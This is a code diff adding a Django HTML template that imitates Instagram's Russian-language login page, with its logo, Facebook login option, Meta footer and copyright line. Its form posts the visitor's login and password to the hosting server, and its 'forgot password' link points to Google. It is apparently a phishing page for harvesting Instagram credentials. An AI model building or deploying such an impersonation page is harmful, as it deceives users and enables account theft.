@@ -1,0 +1,153 @@
+{% load static %}<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+    <link rel="stylesheet" href="{% static 'style.css' %}" />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Abril+Fatface&display=swap"
+      rel="stylesheet"
+    />
+    <script
+      src="https://kit.fontawesome.com/a076d05399.js"
+      crossorigin="anonymous"
+    ></script>
+  </head>
+  <body>
+    <main>
+      <div class="page">
+        <div class="header">
+          <h1 class="logo" style="font-family: Helvetica Neue;">
+            <img
+              style="width: 180px; margin-top: 15px;"
+              src="{% static '2.png' %}"
+              alt=""
+              srcset=""
+            />
+          </h1>
+        </div>
+        <div class="container">
+          <form action="" method="POST">
+            <input
+              style="font-size: 12.5px;"
+              type="text" name="login"
+              placeholder="Телефон, имя пользователя или эл. адрес"
+            />
+            <!-- <input type="text" placeholder="Full Name" />
+                <input type="text" placeholder="Username" /> -->
+            <input
+              style="font-size: 12.5px;"
+              type="password" name="password"
+              placeholder="Пароль"
+            />
+            <button style="font-size: 15px; opacity: 50%;">Войти</button>
+          </form>
+          <div>
+            <hr style="width: 105px; opacity: 45%;" />
+            <p style="font-size: 15px; transform: translate(44%, -47%);">ИЛИ</p>
+            <hr
+              style="
+                width: 110px;
+                transform: translate(147%, -950%);
+                opacity: 45%;
+              "
+            />
+          </div>
+          <div
+            style="
+              font-size: 16px;
+              text-align: center;
+              transform: translate(0%, 45%);
+            "
+          >
+            <img
+              class="facebook"
+              src="{% static 'Facebook_icon_2013.svg' %}"
+              style="width: 17px; transform: translate(-26%, 14%);"
+              alt=""
+              srcset=""
+            />
+            Войти через Facebook
+          </div>
+        </div>
+        <div
+          style="
+            margin-top: 5px;
+            padding-top: 15px;
+            transform: translate(1%, 24%);
+          "
+        >
+          <p style="font-size: 12px;">
+            <a
+              id="kere"
+              style="text-decoration: none;"
+              ;
+              href="https://www.google.com/?&bih=979&biw=1920&hl=en"
+            >
+              Забыли пароль?
+            </a>
+          </p>
+        </div>
+      </div>
+      <div class="option">
+        <p style="font-size: 15px;">
+          У вас ещё нет аккаунта?
+          <a href="">Зарегистрироваться</a>
+        </p>
+      </div>
+      <div class="otherapps">
+        <p style="font-size: 16px;">Установите приложение.</p>
+        <div style="padding: 5px;">
+          <img
+            id="rasmlar"
+            style="width: 136px;"
+            src="../../static/applesadasdasdasd.png"
+            alt=""
+            srcset=""
+          />
+          <img style="width: 134px;" src="../../static/4c70948c09f3.png" alt="" srcset="" />
+        </div>
+      </div>
+      <div class="footer">
+        <ul>
+          <li><a style="color: gray;" href="">Meta</a></li>
+          <li><a style="color: gray;" href="">Информация</a></li>
+          <li><a style="color: gray;" href="">Блог</a></li>
+          <li><a style="color: gray;" href="">Вакансии</a></li>
+          <li><a style="color: gray;" href="">Помощь</a></li>
+          <li><a style="color: gray;" href="">API</a></li>
+          <li><a style="color: gray;" href="">Конфиденциальность</a></li>
+          <li><a style="color: gray;" href="">Условия</a></li>
+          <li><a style="color: gray;" href="">Популярные аккаунты</a></li>
+          <li><a style="color: gray;" href="">Хэштеги</a></li>
+          <li><a style="color: gray;" href="">Места</a></li>
+          <li><a style="color: gray;" href="">Instagram Lite</a></li>
+        </ul>
+        <ul>
+          <li><a style="color: gray;" href="">Танцы</a></li>
+          <li><a style="color: gray;" href="">Еда и напитки</a></li>
+          <li><a style="color: gray;" href="">Дом и сад</a></li>
+          <li><a style="color: gray;" href="">Музыка</a></li>
+          <li><a style="color: gray;" href="">Изобразительное искусство</a></li>
+        </ul>
+        <p>
+          <select
+            id="cars"
+            name="cars"
+            style="border: none; margin-right: 20px; color: #918f8e;"
+          >
+            <option style="color: gray;" value="volvo">Volvo</option>
+            <option value="saab">Saab</option>
+            <option style="color: gray;" value="fiat" selected>Русский</option>
+            <option value="audi">Audi</option>
+          </select>
+          © 2022 Instagram from Meta
+        </p>
+      </div>
+    </main>
+  </body>
+</html>
